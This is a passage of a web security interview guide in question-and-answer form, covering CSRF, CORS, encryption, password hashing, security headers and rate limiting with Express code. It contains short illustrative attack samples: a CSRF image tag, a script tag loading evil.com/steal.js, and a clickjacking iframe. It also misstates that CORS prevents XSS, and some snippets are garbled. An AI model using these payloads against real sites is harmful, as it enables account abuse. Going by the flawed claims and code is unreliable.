  const origin = req.headers.origin || req.headers.referer;
  if (!origin || !origin.startsWith('https://yourdomain.com')) {
    return res.status(403).json({ error: 'Invalid origin' });
  }
  next();
});
`

## Key Points:
- CSRF tokens (unique per session/request)
- SameSite cookies (Strict or Lax)
- Origin/Referer header validation
- Re-authentication for sensitive actions
- Double Submit Cookie pattern

## Interview Tip:
Know multiple prevention methods -- defense in depth is key.

---

## Question: What is a CSRF token?

## Answer:
A CSRF token is a unique, unpredictable value generated by the server and included in forms. The server validates this token on each state-changing request, ensuring the request originated from the legitimate application.

`javascript
// CSRF token implementation
const crypto = require('crypto');

// Generate token
const csrfToken = crypto.randomBytes(32).toString('hex');
session.csrfToken = csrfToken;

// Include in form
<form method=POST action=/transfer>
  <input type=hidden name=_csrf value=" />
 <input name=amount />
 <button type=submit>Transfer</button>
</form>

// Validate on POST
app.post('/transfer', (req, res) => {
 if (req.body._csrf !== session.csrfToken) {
 return res.status(403).json({ error: 'Invalid CSRF token' });
 }
 // Process transfer
});
`

## Key Points:
- Unique, unpredictable value per session/request
- Included in forms as hidden field
- Validated on state-changing requests
- Prevents forged requests from attacker pages
- Use crypto.randomBytes for generation

## Interview Tip:
Explain how CSRF tokens break the attack -- the attacker can't guess the token.

---

## Question: What is SameSite cookie protection?

## Answer:
SameSite cookies prevent cross-site requests from including the cookie, blocking CSRF attacks. Strict never sends cookies cross-site; Lax sends them only with top-level navigation (GET requests from links).

`javascript
// Strict: No cross-site transmission
res.cookie('session', token, { sameSite: 'strict' });

// Lax: Top-level navigation only (recommended)
res.cookie('session', token, { sameSite: 'lax' });

// None: Full cross-site (requires Secure)
res.cookie('session', token, { sameSite: 'none', secure: true });
`

## Key Points:
- Blocks cross-site cookie transmission
- Strict: Never cross-site (may break UX)
- Lax: Top-level navigation only (recommended)
- None: Full cross-site (requires Secure)
- Browser defaults to Lax if not set
- Provides automatic CSRF protection

## Interview Tip:
SameSite is the modern CSRF defense -- it's built into the browser.

---

## Question: What is the difference between CSRF and XSS?

## Answer:
XSS injects malicious scripts that execute in the victim's browser. CSRF tricks authenticated users into making unintended requests. XSS exploits trust in the site; CSRF exploits trust in the user's authentication.

`javascript
// XSS: Attacker injects script
// <script>stealCookies()</script>
// Script executes in user's browser

// CSRF: Attacker tricks user into making request
// <img src=https://bank.com/transfer?to=attacker&amount=10000 />
// Request uses user's existing session
`

## Key Points:
- XSS: Injects scripts that execute in browser
- CSRF: Tricks users into making unintended requests
- XSS exploits site trust; CSRF exploits user authentication
- Different vulnerabilities, different defenses
- XSS: output encoding, CSP; CSRF: tokens, SameSite

## Interview Tip:
Clearly distinguish the two -- they're often confused.

---

## Question: When is CSRF protection required?

## Answer:
CSRF protection is required for any state-changing operation: POST, PUT, DELETE, PATCH requests. GET requests should be idempotent and not change state. I implement CSRF protection on all forms and API endpoints that modify data.

`javascript
// CSRF protection for forms
app.use(csrf({ cookie: true }));

// For API endpoints (state-changing)
app.post('/api/data', csrfProtection, authenticate, async (req, res) => {
 // Process state change
});

// GET requests should not change state
app.get('/api/data', authenticate, async (req, res) => {
 // Read-only, no CSRF protection needed
});
`

## Key Points:
- Required for POST, PUT, DELETE, PATCH requests
- Not required for GET requests (should be idempotent)
- Protect all forms and state-changing endpoints
- APIs using JWT + CORS may not need CSRF tokens
- SameSite cookies provide automatic protection

## Interview Tip:
Know when CSRF protection is and isn't needed.

---

## Question: How does JWT authentication affect CSRF?

## Answer:
JWT stored in httpOnly cookies is not vulnerable to XSS theft but is still vulnerable to CSRF (cookies are sent automatically). JWT stored in Authorization headers is not vulnerable to CSRF (not sent automatically) but is vulnerable to XSS.

`javascript
// JWT in httpOnly cookie: Vulnerable to CSRF
res.cookie('token', jwtToken, { httpOnly: true, secure: true });
// Browser sends cookie automatically -- CSRF possible

// JWT in Authorization header: Not vulnerable to CSRF
fetch('/api/data', {
 headers: { 'Authorization': Bearer }
});
// JavaScript must set header -- CSRF not possible
// But vulnerable to XSS if token in localStorage

// Best practice: Both
res.cookie('refreshToken', refreshToken, { httpOnly: true, secure: true, sameSite: 'strict' });
// Access token in memory or httpOnly cookie
`

## Key Points:
- JWT in httpOnly cookie: Vulnerable to CSRF
- JWT in Authorization header: Not vulnerable to CSRF
- localStorage JWT: Vulnerable to XSS
- Best: httpOnly cookie with SameSite + short-lived access token
- SameSite cookies prevent CSRF for cookie-based JWTs

## Interview Tip:
Know the security trade-offs of different JWT storage methods.

---

## Question: What CSRF prevention best practices do you follow?

## Answer:
I follow comprehensive CSRF prevention: use SameSite cookies (Strict or Lax), implement CSRF tokens for forms, validate Origin/Referer headers, and require re-authentication for sensitive actions.

`javascript
// 1. SameSite cookies (automatic protection)
res.cookie('session', token, { sameSite: 'strict', httpOnly: true, secure: true });

// 2. CSRF tokens for forms
const csrf = require('csurf');
app.use(csrf({ cookie: { httpOnly: true, secure: true, sameSite: 'strict' } }));

// 3. Origin validation
app.use((req, res, next) => {
 const origin = req.headers.origin;
 if (origin && !allowedOrigins.includes(origin)) {
 return res.status(403).json({ error: 'Invalid origin' });
 }
 next();
});

// 4. Re-authentication for sensitive actions
app.post('/api/change-password', authenticate, requireRecentAuth, async (req, res) => {
 // Require re-authentication within last 5 minutes
});
`

## Key Points:
- SameSite cookies (Strict or Lax)
- CSRF tokens for forms
- Origin/Referer header validation
- Re-authentication for sensitive actions
- Defense in depth approach

## Interview Tip:
SameSite is the first line of defense -- CSRF tokens are defense in depth.


---

# CORS & Browser Security (131-140)

## Question: What is CORS?

## Answer:
CORS (Cross-Origin Resource Sharing) is a browser security mechanism that restricts how web pages from one origin can request resources from another origin. It prevents malicious websites from making unauthorized requests to other domains.

`javascript
// CORS middleware (Express)
const cors = require('cors');

app.use(cors({
  origin: 'https://myapp.com',
  methods: ['GET', 'POST', 'PUT', 'DELETE'],
  credentials: true,
  allowedHeaders: ['Content-Type', 'Authorization']
}));
`

## Key Points:
- Browser security mechanism for cross-origin requests
- Restricts how pages request resources from other domains
- Prevents unauthorized cross-origin requests
- Configured via HTTP headers
- Must be explicitly enabled on the server

## Interview Tip:
Explain that CORS is browser-enforced, not server-enforced.

---

## Question: Why does CORS exist?

## Answer:
CORS exists to prevent Cross-Site Scripting (CSS/JS injection) attacks. Without CORS, a malicious website could make requests to your bank's API and read the response. CORS ensures only trusted origins can access resources.

`javascript
// Without CORS: Any site could read your data
// Malicious site could fetch https://bank.com/api/balance

// With CORS: Only allowed origins can access resources
// Server responds with Access-Control-Allow-Origin: https://myapp.com
// Browser blocks requests from other origins
`

## Key Points:
- Prevents unauthorized cross-origin data reading
- Protects sensitive data from malicious sites
- Browser enforces CORS, not the server
- Origin = protocol + domain + port
- Essential for web application security

## Interview Tip:
Explain the threat model -- what would happen without CORS.

---

## Question: How does the browser enforce CORS?

## Answer:
The browser checks the Access-Control-Allow-Origin header in the server's response. If the requesting origin is not in the allowed list, the browser blocks the response from JavaScript.

`javascript
// Simple request: Browser checks Access-Control-Allow-Origin
// Pre-flight: Browser sends OPTIONS request first

// Server response
res.setHeader('Access-Control-Allow-Origin', 'https://myapp.com');
res.setHeader('Access-Control-Allow-Methods', 'GET, POST');
res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
res.setHeader('Access-Control-Allow-Credentials', 'true');
`

## Key Points:
- Browser checks Access-Control-Allow-Origin header
- Blocks response if origin not allowed
- Simple requests: direct check
- Complex requests: preflight OPTIONS request
- Server sends CORS headers in response

## Interview Tip:
Know the difference between simple and complex requests.

---

## Question: What is a preflight request?

## Answer:
A preflight request is an OPTIONS request sent by the browser before certain cross-origin requests. It checks whether the server allows the actual request method, headers, and origin.

`javascript
// Browser sends OPTIONS request
OPTIONS /api/data HTTP/1.1
Origin: https://myapp.com
Access-Control-Request-Method: POST
Access-Control-Request-Headers: Content-Type, Authorization

// Server responds
HTTP/1.1 204 No Content
Access-Control-Allow-Origin: https://myapp.com
Access-Control-Allow-Methods: POST, GET, OPTIONS
Access-Control-Allow-Headers: Content-Type, Authorization
Access-Control-Max-Age: 86400
`

## Key Points:
- OPTIONS request sent before complex cross-origin requests
- Checks if server allows the actual request
- Triggered by non-simple methods (PUT, DELETE, PATCH)
- Triggered by non-simple headers (Authorization, Content-Type)
- Response includes allowed methods, headers, origins

## Interview Tip:
Know what triggers a preflight request.

---

## Question: What is an OPTIONS request?

## Answer:
An OPTIONS request is an HTTP method used to get information about a resource or test server capabilities. In CORS, it's used for preflight requests to check if the actual request is allowed.

`javascript
// Handle OPTIONS requests
app.options('/api/data', cors());

// Or manually
app.options('/api/data', (req, res) => {
  res.setHeader('Access-Control-Allow-Origin', 'https://myapp.com');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
  res.setHeader('Access-Control-Max-Age', '86400');
  res.status(204).end();
});
`

## Key Points:
- HTTP method for getting resource information
- Used in CORS for preflight requests
- Does not return a body (204 No Content)
- Returns allowed methods, headers, origins
- Can be cached with Access-Control-Max-Age

## Interview Tip:
Know that OPTIONS is part of CORS preflight.

---

## Question: What are CORS headers?

## Answer:
CORS headers are HTTP headers sent by the server to indicate which origins, methods, and headers are allowed for cross-origin requests.

`javascript
// CORS headers
res.setHeader('Access-Control-Allow-Origin', 'https://myapp.com');
res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE');
res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
res.setHeader('Access-Control-Allow-Credentials', 'true');
res.setHeader('Access-Control-Max-Age', '86400');
res.setHeader('Access-Control-Expose-Headers', 'X-Custom-Header');
`

## Key Points:
- Access-Control-Allow-Origin: Allowed origins
- Access-Control-Allow-Methods: Allowed HTTP methods
- Access-Control-Allow-Headers: Allowed request headers
- Access-Control-Allow-Credentials: Allow cookies/auth
- Access-Control-Max-Age: Preflight cache duration

## Interview Tip:
Know the most important CORS headers and their values.

---

## Question: What is Access-Control-Allow-Origin?

## Answer:
Access-Control-Allow-Origin specifies which origins are allowed to access the resource. It can be a specific origin, * for all origins, or null.

`javascript
// Specific origin
res.setHeader('Access-Control-Allow-Origin', 'https://myapp.com');

// All origins (not recommended for sensitive data)
res.setHeader('Access-Control-Allow-Origin', '*');

// Multiple origins (dynamic)
const allowedOrigins = ['https://myapp.com', 'https://admin.myapp.com'];
app.use((req, res, next) => {
  const origin = req.headers.origin;
  if (allowedOrigins.includes(origin)) {
    res.setHeader('Access-Control-Allow-Origin', origin);
  }
  next();
});
`

## Key Points:
- Specifies allowed origins for cross-origin requests
- Can be specific origin, *, or null
- * allows all origins (not recommended for sensitive data)
- Must be set per-request for multiple origins
- Combined with Access-Control-Allow-Credentials

## Interview Tip:
Know when to use specific origins vs. *.

---

## Question: What is Access-Control-Allow-Credentials?

## Answer:
Access-Control-Allow-Credentials indicates whether the response can be accessed with credentials (cookies, HTTP auth). It's required when you want to send cookies cross-origin.

`javascript
// Allow credentials
res.setHeader('Access-Control-Allow-Credentials', 'true');

// Client must include credentials
fetch('https://api.myapp.com/data', {
  credentials: 'include' // Sends cookies
});

// Note: Cannot use Access-Control-Allow-Origin: * with credentials
`

## Key Points:
- Indicates if response accessible with credentials
- Required for cookies cross-origin
- Client must set credentials: 'include'
- Cannot combine with Access-Control-Allow-Origin: *
- Set to 'true' or omit (default false)

## Interview Tip:
Know the limitation with * -- you can't use both.

---

## Question: How do you configure CORS securely?

## Answer:
I configure CORS securely by specifying explicit origins, limiting allowed methods and headers, enabling credentials only when needed, and setting appropriate cache durations.

`javascript
const corsOptions = {
  origin: (origin, callback) => {
    const allowedOrigins = ['https://myapp.com', 'https://admin.myapp.com'];
    if (!origin || allowedOrigins.includes(origin)) {
      callback(null, true);
    } else {
      callback(new Error('Not allowed by CORS'));
    }
  },
  methods: ['GET', 'POST', 'PUT', 'DELETE'],
  credentials: true,
  allowedHeaders: ['Content-Type', 'Authorization'],
  exposedHeaders: ['X-Total-Count'],
  maxAge: 86400 // 24 hours
};

app.use(cors(corsOptions));
`

## Key Points:
- Specify explicit origins (not *)
- Limit allowed methods and headers
- Enable credentials only when needed
- Set maxAge for preflight caching
- Validate origin dynamically if needed
- Don't expose unnecessary headers

## Interview Tip:
Show dynamic origin validation -- it's more secure than static configuration.

---

## Question: What are common CORS mistakes?

## Answer:
Common CORS mistakes include: using * with credentials, not validating origins dynamically, exposing sensitive headers, not setting maxAge (causing frequent preflights), and assuming CORS provides authentication.

`javascript
// Mistake 1: * with credentials (browser blocks)
res.setHeader('Access-Control-Allow-Origin', '*');
res.setHeader('Access-Control-Allow-Credentials', 'true'); // ERROR

// Mistake 2: Not validating origins
res.setHeader('Access-Control-Allow-Origin', req.headers.origin); // Echoes any origin

// Mistake 3: No maxAge (frequent preflights)
res.setHeader('Access-Control-Allow-Origin', 'https://myapp.com');
// Missing: Access-Control-Max-Age
`

## Key Points:
- Don't use * with credentials
- Don't echo Origin header without validation
- Set maxAge to reduce preflight requests
- CORS is not authentication -- implement auth separately
- Limit allowed methods and headers
- Test CORS configuration thoroughly

## Interview Tip:
Know the common pitfalls -- it shows practical experience.


---

# Encryption & Password Security (141-150)

## Question: What is encryption?

## Answer:
Encryption converts plaintext into ciphertext using an algorithm and key. Only authorized parties with the correct key can decrypt and read the original data. I use encryption for data at rest (database encryption) and data in transit (TLS/HTTPS).

`javascript
// Symmetric encryption (AES)
const crypto = require('crypto');
const algorithm = 'aes-256-gcm';
const key = crypto.randomBytes(32);
const iv = crypto.randomBytes(16);

function encrypt(text) {
  const cipher = crypto.createCipheriv(algorithm, key, iv);
  let encrypted = cipher.update(text, 'utf8', 'hex');
  encrypted += cipher.final('hex');
  const authTag = cipher.getAuthTag();
  return { encrypted, iv: iv.toString('hex'), authTag: authTag.toString('hex') };
}

function decrypt(encrypted, ivHex, authTagHex) {
  const decipher = crypto.createDecipheriv(algorithm, key, Buffer.from(ivHex, 'hex'));
  decipher.setAuthTag(Buffer.from(authTagHex, 'hex'));
  let decrypted = decipher.update(encrypted, 'hex', 'utf8');
  decrypted += decipher.final('utf8');
  return decrypted;
}
`

## Key Points:
- Converts plaintext to ciphertext
- Requires key for encryption and decryption
- Protects data at rest and in transit
- Symmetric: same key for encrypt/decrypt
- Asymmetric: public key encrypt, private key decrypt

## Interview Tip:
Know the difference between symmetric and asymmetric encryption.

---

## Question: What is the difference between encryption and hashing?

## Answer:
Encryption is reversible (with the key); hashing is one-way (irreversible). Encryption protects data confidentiality; hashing ensures data integrity. I use encryption for sensitive data storage and hashing for passwords and checksums.

`javascript
// Encryption: Reversible with key
const encrypted = encrypt('sensitive data');
const decrypted = decrypt(encrypted); // 'sensitive data'

// Hashing: Irreversible
const hash = bcrypt.hashSync('password', 12);
bcrypt.compareSync('password', hash); // true
// Cannot reverse hash to get 'password'
`

## Key Points:
- Encryption: reversible with key
- Hashing: one-way, irreversible
- Encryption: data confidentiality
- Hashing: data integrity, password storage
- Never encrypt passwords -- hash them
- Never hash data that needs to be decrypted

## Interview Tip:
Clearly distinguish the two -- they serve different purposes.

---

## Question: What is symmetric encryption?

## Answer:
Symmetric encryption uses the same key for encryption and decryption. It's fast and efficient for large data. I use AES-256-GCM for authenticated encryption, which provides both confidentiality and integrity.

`javascript
// AES-256-GCM symmetric encryption
const crypto = require('crypto');

function encrypt(text, key) {
  const iv = crypto.randomBytes(16);
  const cipher = crypto.createCipheriv('aes-256-gcm', key, iv);
  let encrypted = cipher.update(text, 'utf8', 'hex');
  encrypted += cipher.final('hex');
  const authTag = cipher.getAuthTag();
  return { iv: iv.toString('hex'), encrypted, authTag: authTag.toString('hex') };
}

// Key must be kept secret
const key = crypto.randomBytes(32); // 256 bits
`

## Key Points:
- Same key for encryption and decryption
- Fast and efficient for large data
- Key must be kept secret
- AES-256-GCM recommended (authenticated encryption)
- Used for data at rest and in transit (with TLS)

## Interview Tip:
Know that symmetric encryption needs secure key distribution.

---

## Question: What is asymmetric encryption?

## Answer:
Asymmetric encryption uses a public key for encryption and a private key for decryption. It solves the key distribution problem -- anyone can encrypt with the public key, but only the private key holder can decrypt.

`javascript
// RSA asymmetric encryption
const crypto = require('crypto');

// Generate key pair
const { publicKey, privateKey } = crypto.generateKeyPairSync('rsa', {
  modulusLength: 2048,
});

// Encrypt with public key
function encrypt(text, publicKey) {
  const buffer = Buffer.from(text, 'utf8');
  const encrypted = crypto.publicEncrypt(publicKey, buffer);
  return encrypted.toString('base64');
}

// Decrypt with private key
function decrypt(encrypted, privateKey) {
  const buffer = Buffer.from(encrypted, 'base64');
  const decrypted = crypto.privateDecrypt(privateKey, buffer);
  return decrypted.toString('utf8');
}
`

## Key Points:
- Public key encrypts, private key decrypts
- Solves key distribution problem
- Slower than symmetric encryption
- Used for JWT signatures (RS256), TLS, key exchange
- RSA 2048+ bits recommended

## Interview Tip:
Know when to use symmetric vs. asymmetric -- symmetric for bulk data, asymmetric for key exchange and signatures.

---

## Question: What is TLS/HTTPS?

## Answer:
TLS (Transport Layer Security) encrypts communication between client and server. HTTPS is HTTP over TLS. It ensures confidentiality (data can't be read), integrity (data can't be modified), and authentication (server identity verified via certificates).

`javascript
// Enable HTTPS in production
const https = require('https');
const fs = require('fs');

const options = {
  key: fs.readFileSync('private-key.pem'),
  cert: fs.readFileSync('certificate.pem'),
};

https.createServer(options, app).listen(443);

// Redirect HTTP to HTTPS
app.use((req, res, next) => {
  if (req.headers['x-forwarded-proto'] !== 'https') {
    return res.redirect(301, https://);
  }
  next();
});
`

## Key Points:
- Encrypts communication between client and server
- Provides confidentiality, integrity, authentication
- Uses certificates to verify server identity
- Always use in production
- Enable HSTS for additional security

## Interview Tip:
Know the TLS handshake at a high level.

---

## Question: How does HTTPS work?

## Answer:
HTTPS works by establishing a TLS connection: the client requests a secure connection, the server presents its certificate, the client verifies the certificate, they negotiate a symmetric key, and all communication is encrypted with that key.

`javascript
// TLS handshake (simplified)
// 1. Client Hello: I support TLS 1.3, AES-256-GCM
// 2. Server Hello: I'll use TLS 1.3, AES-256-GCM
// 3. Server presents certificate
// 4. Client verifies certificate (CA chain)
// 5. Key exchange (ECDHE)
// 6. Both derive symmetric key
// 7. Encrypted communication begins
`

## Key Points:
- Client and server negotiate TLS version and cipher suite
- Server presents certificate for verification
- Client verifies certificate chain
- Symmetric key exchanged via asymmetric encryption
- All subsequent communication encrypted with symmetric key

## Interview Tip:
Know the high-level TLS handshake steps.

---

## Question: Why should passwords never be stored as plain text?

## Answer:
Plain text passwords expose all users if the database is compromised. Hashing ensures that even if the database is breached, attackers can't recover original passwords. I always hash passwords with bcrypt, scrypt, or Argon2.

`javascript
// NEVER store plain text
// If database leaks: user: password123

// Always hash
const hash = await bcrypt.hash('password123', 12);
// If database leaks: user: ...
// Attacker cannot recover 'password123'
`

## Key Points:
- Plain text exposes all passwords on breach
- Hashing makes passwords unrecoverable
- Use bcrypt, scrypt, or Argon2
- Never use MD5 or SHA for passwords
- Salting prevents rainbow table attacks
- Comply with security standards (GDPR, HIPAA)

## Interview Tip:
Emphasize the impact of a breach -- all users compromised if plain text.

---

## Question: What is password hashing?

## Answer:
Password hashing is a one-way transformation of a password into a fixed-length string using a cryptographic hash function with salt. I use bcrypt, scrypt, or Argon2 which are designed for password hashing -- they're slow and include salt.

`javascript
// bcrypt password hashing
const bcrypt = require('bcrypt');

// Hash password
const saltRounds = 12;
const hash = await bcrypt.hash('password123', saltRounds);
// Result: ...

// Verify password
const isValid = await bcrypt.compare('password123', hash);
// Returns true if password matches
`

## Key Points:
- One-way transformation with salt
- Use bcrypt (12+ rounds), scrypt, or Argon2
- Never use MD5, SHA-1, or SHA-256 alone
- Salt prevents rainbow table attacks
- Slow by design (prevents brute-force)
- Include version info in hash for algorithm upgrades

## Interview Tip:
Know why bcrypt is preferred over SHA -- it's slow by design.

---

## Question: What are bcrypt, scrypt, and Argon2?

## Answer:
These are password hashing algorithms designed for security. bcrypt is the most widely used, scrypt is memory-hard (resistant to hardware attacks), and Argon2 is the newest and most secure (winner of the Password Hashing Competition).

`javascript
// bcrypt
const bcrypt = require('bcrypt');
const hash = await bcrypt.hash(password, 12);

// scrypt
const crypto = require('crypto');
const hash = crypto.scryptSync(password, salt, 64).toString('hex');

// Argon2 (recommended)
const argon2 = require('argon2');
const hash = await argon2.hash(password, {
  type: argon2.argon2id,
  memoryCost: 65536,
  timeCost: 3,
  parallelism: 4
});
`

## Key Points:
- bcrypt: widely used, 12+ rounds recommended
- scrypt: memory-hard, resistant to hardware attacks
- Argon2: newest, most secure, PHC winner
- All include salt automatically
- All are slow by design (prevents brute-force)
- Choose based on requirements and libraries available

## Interview Tip:
Know the differences and when to choose each one.

---

## Question: What password security best practices do you follow?

## Answer:
I follow comprehensive password security practices: hash with bcrypt (12+ rounds), enforce strong password policies, implement rate limiting and account lockout, use MFA, and never log passwords.

`javascript
// 1. Hash with bcrypt
const hash = await bcrypt.hash(password, 12);

// 2. Strong password policy
function isStrongPassword(password) {
  return password.length >= 12 &&
         /[A-Z]/.test(password) &&
         /[a-z]/.test(password) &&
         /[0-9]/.test(password) &&
         /[^A-Za-z0-9]/.test(password);
}

// 3. Rate limiting
const rateLimit = require('express-rate-limit');
app.use('/api/login', rateLimit({ windowMs: 15 * 60 * 1000, max: 5 }));

// 4. Account lockout
async function handleFailedLogin(userId) {
  const attempts = await db.incrementLoginAttempts(userId);
  if (attempts >= 5) {
    await db.lockAccount(userId, 15 * 60 * 1000); // 15 minutes
  }
}
`

## Key Points:
- Hash with bcrypt (12+ rounds), scrypt, or Argon2
- Enforce strong password policies (min 12 characters, complexity)
- Implement rate limiting and account lockout
- Use MFA for additional security
- Never log or expose passwords
- Use HTTPS for all authentication

## Interview Tip:
Have a comprehensive list of password security best practices.


---

# Security Headers & Browser Protection (151-160)

## Question: What are HTTP security headers?

## Answer:
HTTP security headers are response headers that instruct the browser to enforce security policies. I use helmet middleware in Express to set them automatically.

`javascript
const helmet = require('helmet');
app.use(helmet());
// Sets: Content-Security-Policy, HSTS, X-Content-Type-Options,
// X-Frame-Options, X-XSS-Protection, and more
`

## Key Points:
- Response headers enforcing browser security policies
- Set by server in HTTP response
- Browser enforces the policies
- Use helmet middleware for easy implementation
- Essential for production security

## Interview Tip:
Know the most important security headers and their purposes.

---

## Question: Why are security headers important?

## Answer:
Security headers protect against XSS, clickjacking, MIME sniffing, and other browser-based attacks. Without them, the browser defaults to less secure behavior. I set security headers on every response.

## Key Points:
- Protect against browser-based attacks
- Browser enforces the policies
- Without them, browser defaults to insecure behavior
- Easy to implement with helmet
- Essential for production applications

## Interview Tip:
Explain what each header prevents -- it shows practical knowledge.

---

## Question: What is Content Security Policy (CSP)?

## Answer:
CSP is a security header that restricts which resources (scripts, styles, images) the browser can load. It's one of the most effective defenses against XSS.

`javascript
app.use(helmet.contentSecurityPolicy({
  directives: {
    defaultSrc: ['self'],
    scriptSrc: ['self'],
    styleSrc: ['self', 'unsafe-inline'],
    imgSrc: ['self', data:, https:],
    fontSrc: ['self'],
    connectSrc: ['self'],
    frameSrc: ['none'],
    objectSrc: ['none'],
    baseUri: ['self'],
    formAction: ['self'],
    upgradeInsecureRequests: []
  }
}));
`

## Key Points:
- Restricts resource loading by the browser
- Prevents XSS by blocking unauthorized scripts
- Directives control specific resource types
- 'self' allows resources from same origin
- 'unsafe-inline' should be avoided
- Report-uri directive for monitoring violations

## Interview Tip:
Know the most important CSP directives.

---

## Question: How does CSP prevent XSS attacks?

## Answer:
CSP prevents XSS by blocking unauthorized script execution. If an attacker injects a script from an external domain, CSP blocks it because only scripts from allowed origins can execute.

`javascript
// CSP blocks external scripts
// scriptSrc: ['self']
// Attacker injects: <script src=https://evil.com/steal.js></script>
// Browser blocks: Refused to load the script because it violates CSP

// CSP blocks inline scripts
// Attacker injects: <script>alert('xss')</script>
// Browser blocks: Refused to execute inline script because it violates CSP
`

## Key Points:
- Blocks scripts from unauthorized origins
- Blocks inline scripts (unless 'unsafe-inline')
- Blocks eval() and similar functions
- Provides defense in depth against XSS
- Can report violations for monitoring

## Interview Tip:
Explain both origin-based and inline script blocking.

---

## Question: What is the X-Frame-Options header?

## Answer:
X-Frame-Options prevents the page from being embedded in iframes, protecting against clickjacking attacks. I set it to DENY or SAMEORIGIN.

`javascript
app.use(helmet.frameguard({ action: 'deny' }));
// or
app.use(helmet.frameguard({ action: 'sameorigin' }));

// Response header
// X-Frame-Options: DENY
`

## Key Points:
- Prevents page from being iframed
- Values: DENY (no framing), SAMEORIGIN (same origin only)
- Protects against clickjacking
- Deprecated in favor of CSP frame-ancestors
- Should still be set for older browsers

## Interview Tip:
Know both DENY and SAMEORIGIN options.

---

## Question: What is clickjacking?

## Answer:
Clickjacking tricks users into clicking on hidden elements by embedding a legitimate page in an iframe and overlaying malicious content. X-Frame-Options and CSP frame-ancestors prevent this.

`html
<!-- Clickjacking attack -->
<iframe src=https://bank.com/transfer style=opacity: 0; position: absolute;>
</iframe>
<button style=position: absolute; top: 100px; left: 100px;>
  Click here to win a prize!
</button>
<!-- User thinks they're clicking win a prize but actually clicks transfer -->
`

## Key Points:
- Tricks users into clicking hidden elements
- Embeds legitimate page in hidden iframe
- Overlayed with misleading content
- Prevented by X-Frame-Options and CSP frame-ancestors
- Can lead to unintended actions

## Interview Tip:
Show the HTML example -- it makes the attack clear.

---

## Question: What is the X-Content-Type-Options header?

## Answer:
X-Content-Type-Options: nosniff prevents the browser from MIME-sniffing responses, forcing it to respect the Content-Type header. This prevents malicious files from being executed as scripts.

`javascript
app.use(helmet.noSniff());
// Response header
// X-Content-Type-Options: nosniff
`

## Key Points:
- Prevents MIME-sniffing of responses
- Forces browser to respect Content-Type header
- Prevents malicious files from executing as scripts
- Set to 'nosniff'
- Simple but effective security header

## Interview Tip:
Explain what MIME-sniffing is -- browser guessing content type.

---

## Question: What is HTTP Strict Transport Security (HSTS)?

## Answer:
HSTS tells the browser to only use HTTPS for the specified domain, preventing downgrade attacks. I set it with a long max-age and include subdomains.

`javascript
app.use(helmet.hsts({
  maxAge: 31536000, // 1 year
  includeSubDomains: true,
  preload: true
}));

// Response header
// Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
`

## Key Points:
- Forces HTTPS for the domain
- Prevents HTTP downgrade attacks
- maxAge: how long browser should enforce HTTPS
- includeSubDomains: applies to all subdomains
- preload: submit to browser preload list
- Set long max-age (1 year recommended)

## Interview Tip:
Know the preload directive -- it's submitted to browser vendors.

---

## Question: What is the Referrer-Policy header?

## Answer:
Referrer-Policy controls how much referrer information is sent with requests. It prevents sensitive information from leaking in URLs.

`javascript
app.use(helmet.referrerPolicy({ policy: 'strict-origin-when-cross-origin' }));

// Options
// no-referrer: No referrer sent
// same-origin: Referrer only for same-origin requests
// strict-origin-when-cross-origin: Full URL for same-origin, origin for cross-origin
`

## Key Points:
- Controls referrer information in requests
- Prevents sensitive URL information leakage
- Options: no-referrer, same-origin, strict-origin-when-cross-origin
- strict-origin-when-cross-origin recommended
- Balances security with functionality

## Interview Tip:
Know the recommended policy and why.

---

## Question: What security headers should every production application use?

## Answer:
Every production application should use: Content-Security-Policy, Strict-Transport-Security, X-Content-Type-Options, X-Frame-Options, Referrer-Policy, and Permissions-Policy.

`javascript
const helmet = require('helmet');

app.use(helmet());
// Automatically sets all recommended headers

// Or configure individually
app.use(helmet.contentSecurityPolicy({ /* ... */ }));
app.use(helmet.hsts({ maxAge: 31536000, includeSubDomains: true, preload: true }));
app.use(helmet.noSniff());
app.use(helmet.frameguard({ action: 'deny' }));
app.use(helmet.referrerPolicy({ policy: 'strict-origin-when-cross-origin' }));
app.use(helmet.permittedCrossDomainPolicies({ permittedPolicies: 'none' }));
`

## Key Points:
- Content-Security-Policy (XSS prevention)
- Strict-Transport-Security (HTTPS enforcement)
- X-Content-Type-Options (MIME-sniffing prevention)
- X-Frame-Options (clickjacking prevention)
- Referrer-Policy (information leakage prevention)
- Permissions-Policy (feature access control)

## Interview Tip:
Use helmet -- it sets all recommended headers automatically.


---

# Rate Limiting & Attack Prevention (161-170)

## Question: What is rate limiting?

## Answer:
Rate limiting restricts the number of requests a client can make within a time window. I implement it on all API endpoints to prevent abuse, brute-force attacks, and denial-of-service.

`javascript
const rateLimit = require('express-rate-limit');
const RedisStore = require('rate-limit-redis');

// General rate limiting
app.use(rateLimit({
  store: new RedisStore({ client: redisClient }),
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 100, // 100 requests per window
  message: { error: 'Too many requests' }
}));

// Stricter limit for auth endpoints
app.use('/api/login', rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 5, // 5 attempts per 15 minutes
  skipSuccessfulRequests: true
}));
`

## Key Points:
- Restricts requests per time window
- Prevents abuse and brute-force attacks
- Implement on all endpoints
- Stricter limits on authentication endpoints
- Use Redis for distributed rate limiting
- Return 429 Too Many Requests

## Interview Tip:
Know the difference between general and endpoint-specific rate limiting.

---

## Question: Why is rate limiting important?

## Answer:
Rate limiting prevents brute-force attacks, credential stuffing, denial-of-service, API abuse, and scraping. Without it, attackers can make unlimited attempts to guess passwords or exploit vulnerabilities.

`javascript
// Without rate limiting: Attacker tries 1000 passwords per second
// With rate limiting: 5 attempts per 15 minutes, then blocked
`

## Key Points:
- Prevents brute-force and credential stuffing
- Mitigates denial-of-service attacks
- Prevents API abuse and scraping
- Protects server resources
- Essential for authentication endpoints
- Required for compliance in some cases

## Interview Tip:
Give specific attack scenarios that rate limiting prevents.

---

## Question: How do you implement API rate limiting?

## Answer:
I implement rate limiting using express-rate-limit with Redis store for distributed applications. I configure different limits for different endpoint categories.

`javascript
const rateLimit = require('express-rate-limit');
const RedisStore = require('rate-limit-redis');

// Redis store for distributed apps
const redisClient = createClient();

// General API limit
const apiLimiter = rateLimit({
